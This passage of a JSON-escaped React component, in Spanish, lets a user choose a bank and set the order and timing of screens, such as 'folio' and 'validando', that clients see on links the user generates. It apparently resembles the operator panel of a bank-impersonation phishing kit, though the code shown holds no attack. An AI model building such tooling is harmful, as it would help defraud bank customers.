useToast();\n  const [selectedBank, setSelectedBank] = useState<string>('');\n  const [flowSteps, setFlowSteps] = useState<FlowStep[]>([]);\n\n  // Obtener flujo existente del usuario para el banco seleccionado\n  const { data: flowData, isLoading } = useQuery<{ success: boolean; flow: { flowConfig: FlowStep[] } | null }>({\n    queryKey: ['/api/user-flows', selectedBank],\n    queryFn: async () => {\n      const response = await fetch(`/api/user-flows/${selectedBank}`);\n      if (!response.ok) throw new Error('Error al obtener flujo');\n      return response.json();\n    },\n    enabled: !!selectedBank,\n  });\n\n  // Cargar flujo cuando se obtiene\n  useEffect(() => {\n    if (flowData?.flow?.flowConfig) {\n      setFlowSteps(flowData.flow.flowConfig);\n    } else if (selectedBank && !isLoading && flowData) {\n      // Si no hay flujo, iniciar con uno b谩sico\n      setFlowSteps([\n        { screenType: ScreenType.FOLIO, waitForUserInput: true }\n      ]);\n    }\n  }, [flowData, isLoading, selectedBank]);\n\n  // Mutaci贸n para guardar flujo\n  const saveMutation = useMutation({\n    mutationFn: async () => {\n      if (!selectedBank) throw new Error('Seleccione un banco');\n      if (flowSteps.length === 0) throw new Error('Agregue al menos un paso al flujo');\n\n      const response = await fetch(`/api/user-flows/${selectedBank}`, {\n        method: 'PUT',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ flowConfig: flowSteps })\n      });\n      \n      if (!response.ok) {\n        const error = await response.json();\n        throw new Error(error.message || 'Error al guardar el flujo');\n      }\n      \n      return response.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/user-flows', selectedBank] });\n      toast({\n        title: 'Flujo guardado',\n        description: 'Tu flujo personalizado se guard贸 correctamente y se aplicar谩 a todos los links que generes para este banco',\n      });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: 'Error',\n        description: error.message,\n        variant: 'destructive'\n      });\n    }\n  });\n\n  const addStep = () => {\n    setFlowSteps([...flowSteps, {\n      screenType: ScreenType.VALIDANDO,\n      durationMs: 3000,\n      waitForUserInput: false\n    }]);\n  };\n\n  const removeStep = (index: number) => {\n    setFlowSteps(flowSteps.filter((_, i) => i !== index));\n  };\n\n  const moveStep = (index: number, direction: 'up' | 'down') => {\n    const newSteps = [...flowSteps];\n    const targetIndex = direction === 'up' ? index - 1 : index + 1;\n    \n    if (targetIndex < 0 || targetIndex >= newSteps.length) return;\n    \n    [newSteps[index], newSteps[targetIndex]] = [newSteps[targetIndex], newSteps[index]];\n    setFlowSteps(newSteps);\n  };\n\n  const updateStep = (index: number, field: keyof FlowStep, value: any) => {\n    const newSteps = [...flowSteps];\n    newSteps[index] = { ...newSteps[index], [field]: value };\n    setFlowSteps(newSteps);\n  };\n\n  const handleBankChange = (bankCode: string) => {\n    setSelectedBank(bankCode);\n    setFlowSteps([]); // Limpiar pasos al cambiar de banco\n  };\n\n  return (\n    <div className=\"container mx-auto p-6 space-y-6\" data-testid=\"user-flow-manager\">\n      <div>\n        <h1 className=\"text-3xl font-bold mb-2\" data-testid=\"title-user-flow\">Mis Flujos Personalizados</h1>\n        <p className=\"text-muted-foreground\" data-testid=\"description-user-flow\">\n          Configura c贸mo se ver谩n las pantallas cuando tus clientes accedan a los links que generes\n        </p>\n      </div>\n\n      {/* Informaci贸n de uso */}\n      <Card className=\"bg-blue-50 dark:bg-blue-950 border-blue-200 dark:border-blue-800\">\n        <CardContent className=\"pt-6\">\n          <div className=\"flex gap-3\">\n            <Info className=\"w-5 h-5 text-blue-600 dark:text-blue-400 flex-shrink-0 mt-0.5\" />\n            <div className=\"text-sm text-blue-900 dark:text-blue-100\">\n              <p className=\"font-medium mb-1\">驴C贸mo funciona?</p>\n              <ul className=\"list-disc list-inside space-y-1 text-blue-800 dark:text-blue-200\">\n                <li>Selecciona un banco y configura el flujo de pantallas que ver谩n tus clientes</li>\n                <li>Cuando generes un link para este banco, se aplicar谩 autom谩ticamente tu flujo personalizado</li>\n                <li>Las pantallas avanzar谩n seg煤n el tiempo configurado o cuando el usuario ingrese datos</li>\n              </ul>\n            </div>\n          </div>\n        </CardContent>\n      </Card>\n\n      {/* Selector de Banco */}\n      <Card>\n        <CardHeader>\n          <CardTitle>Seleccionar Banco</CardTitle>\n          <CardDescription>Elige el banco para configurar tu flujo personalizado</CardDescription>\n        </CardHeader>\n        <CardContent>\n          <Select value={selectedBank} onValueChange={handleBankChange}>\n            <SelectTrigger data-testid=\"select-bank\">\n              <SelectValue placeholder=\"Seleccione un banco...\" />\n            </SelectTrigger>\n            <SelectContent>\n              {BANKS.map(bank => (\n                <SelectItem key={bank.code} value={bank.code} data-testid={`option-bank-${bank.code}`}>\n                  {bank.name}\n                </SelectItem>\n              ))}\n            </SelectContent>\n          </Select>\n        </CardContent>\n      </Card>\n\n      {/* Configurador de Flujo */}\n      {selectedBank && (\n        <>\n          <Card>\n            <CardHeader>\n              <div className=\"flex items-center justify-between\">\n                <div>\n                  <CardTitle>Flujo de Pantallas - {BANKS.find(b => b.code === selectedBank)?.name}</CardTitle>\n                  <CardDescription>\n                    Define el orden y configuraci贸n de las pantallas que ver谩n tus clientes\n                  </CardDescription>\n                </div>\n                <Button onClick={addStep} data-testid=\"button-add-step\">\n                  <Plus className=\"w-4 h-4 mr-2\" />\n                  Agregar Paso\n                </Button>\n              </div>\n            </CardHeader>\n            <CardContent className=\"space-y-4\">\n              {flowSteps.length === 0 ? (\n                <div className=\"text-center py-8 text-muted-foreground\" data-testid=\"text-no-steps\">\n                  No hay pasos configurados. Haz clic en \"Agregar Paso\" para comenzar.\n                </div>\n              ) : (\n                flowSteps.map((step, index) => (\n                  <Card key={index} className=\"border-2\" data-testid={`card-step-${index}`}>\n                    <CardContent className=\"pt-6\">\n                      <div className=\"grid grid-cols-1 md:grid-cols-12 gap-4 items-start\">\n                        {/* N煤mero de paso */}\n                        <div className=\"md:col-span-1 flex items-center justify-center\">\n                          <div className=\"w-8 h-8 rounded-full bg-primary text-primary-foreground flex items-center justify-center font-bold\" data-testid={`text-step-number-${index}`}>\n                            {index + 1}\n                          </div>\n                        </div>\n\n                        {/* Tipo de pantalla */}\n                        <div className=\"md:col-span-5 space-y-2\">\n                          <Label>Tipo de Pantalla</Label>\n                          <Select\n                            value={step.screenType}\n                            onValueChange={(value) => updateStep(index, 'screenType', value)}\n                          >\n                            <SelectTrigger data-testid={`select-screen-type-${index}`}>\n                              <SelectValue />\n                            </SelectTrigger>\n                            <SelectContent>\n                              {SCREEN_TYPES.map(screen => (\n                                <SelectItem key={screen.value} value={screen.value} data-testid={`option-screen-${screen.value}-${index}`}>\n                                  {screen.label}\n                                </SelectItem>\n                              ))}\n                            </SelectContent>\n                          </Select>\n                        </div>\n\n                        {/* Configuraci贸n */}\n                        <div className=\"md:col-span-4 space-y-2\">\n                          <Label>Configuraci贸n</Label>\n                          <div className=\"flex gap-2\">\n                            <div className=\"flex-1\">\n                              <Input\n                                type=\"number\"\n                                placeholder=\"Duraci贸n (ms)\"\n                                value={step.durationMs || ''}\n                                onChange={(e) => updateStep(index, 'durationMs', parseInt(e.target.value) || undefined)}\n                                disabled={step.waitForUserInput}\n                                data-testid={`input-duration-${index}`}\n                              />\n                            </div>\n                            <div className=\"flex items-center gap-2\">\n                              <input\n                                type=\"checkbox\"\n                                id={`wait-${index}`}\n                                checked={step.waitForUserInput || false}\n                                onChange={(e) => {\n                                  const newSteps = [...flowSteps];\n                                  newSteps[index] = {\n                                    ...newSteps[index],\n                                    waitForUserInput: e.target.checked,\n                                    durationMs: e.target.checked ? undefined : newSteps[index].durationMs\n                                  };\n                                  setFlowSteps(newSteps);\n                                }}\n                                data-testid={`checkbox-wait-input-${index}`}\n                              />\n                              <Label htmlFor={`wait-${index}`} className=\"text-xs whitespace-nowrap\">\n                                Esperar usuario\n                              </Label>\n                            </div>\n                          </div>\n                        </div>\n\n                        {/* Acciones */}\n                        <div className=\"md:col-span-2 flex gap-1 justify-end\">\n                          <Button\n                            variant=\"ghost\"\n                            size=\"icon\"\n                            onClick={() => moveStep(index, 'up')}\n                            disabled={index === 0}\n                            data-testid={`button-move-up-${index}`}\n                          >\n                            <MoveUp className=\"w-4 h-4\" />\n                          </Button>\n                          <Button\n                            variant=\"ghost\"\n                            size=\"icon\"\n                            onClick={() => moveStep(index, 'down')}\n                            disabled={index === flowSteps.length - 1}\n                            data-testid={`button-move-down-${index}`}\n                          >\n                            <MoveDown className=\"w-4 h-4\" />\n                          </Button>\n                          <Button\n                            variant=\"ghost\"\n                            size=\"icon\"\n                            onClick={() => removeStep(index)}\n                            data-testid={`button-remove-step-${index}`}\n                          >\n                            <Trash2 className=\"w-4 h-4 text-destructive\" />\n                          </Button>\n                        </div>\n                      </div>\n\n                      {/* Descripci贸n del paso */}\n                      <div className=\"mt-2 text-xs text-muted-foreground\" data-testid={`text-step-description-${index}`}>\n                        {step.waitForUserInput \n                          ? '革 El flujo esperar谩 hasta que el usuario complete esta pantalla'\n                          : step.durationMs\n                          ? `憋 Mostrar谩 esta pantalla durante ${step.durationMs / 1000} segundos`\n                          : ' Pasar谩 inmediatamente a la siguiente pantalla'\n                        }\n                      </div>\n                    </CardContent>\n                  </Card>\n                ))\n              )}\n            </CardContent>\n          </Card>\n\n          {/* Bot贸n Guardar */}\n          {flowSteps.length > 0 && (\n            <div className=\"flex justify-end\">\n              <Button\n                onClick={() => saveMutation.mutate()}\n                disabled={saveMutation.isPending}\n                size=\"lg\"\n                data-testid=\"button-save-flow\"\n              >\n                <Save className=\"w-4 h-4 mr-2\" />\n                {saveMutation.isPending ? 'Guardando...' : 'Guardar Flujo'}\n              </Button>\n            </div>\n          )}\n        </>\n      )}\n    </div>\n  );\n}\n","size_bytes":15760}},"version":2}